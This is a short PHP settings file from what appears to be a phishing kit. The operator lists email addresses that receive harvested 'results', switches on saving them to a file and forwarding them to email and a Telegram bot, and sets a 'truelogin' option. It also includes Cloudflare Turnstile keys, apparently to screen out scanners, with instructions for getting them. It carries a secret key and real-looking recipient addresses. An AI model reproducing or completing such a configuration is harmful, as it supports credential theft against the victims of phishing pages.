<?php
/* PUT YOUR EMAILS HERE */
$contacts = array("infoparasails.net@gmail.com","donnasimplydonna@yahoo.com","");  //....as many email address as you need
$truelogin = 'on'; // on / off
/* OPTIONS TO SAVE AND SEND YOUR RESULTS */
$save_results_to_file = "on";           // on / off
$send_results_to_telegram = "on";          // on / off
$send_results_to_email = "on";          // on / off

/* TELEGRAM BOT INFORMATION */
$bot_token = "";
$chat_id = "";

/* CLOUDFLARE RECAPTCHA */
$sitekey = "0x4AAAAAAAFo1IDSnawE0KN8"; 
$secret_key = "0x4AAAAAAAFo1PnmWptWhY33srxU3XtjOiM";

// How to get Cloudflare reCaptcha sitekey & secret_key?.
// Step 1: Go to the Cloudflare website: https://dash.cloudflare.com/login
// Step 2: Sign in to Cloudflare account or create a new one if you don't already have one.
// After Login you will be redirected on Cloudflare dashboard.
// Step 3: click on 'Turnstile' Tab: https://i.imgur.com/eJSxqzj.png
// Step 4: Select Add a site and fill out the form.
// Copy your sitekey and secret key.


?>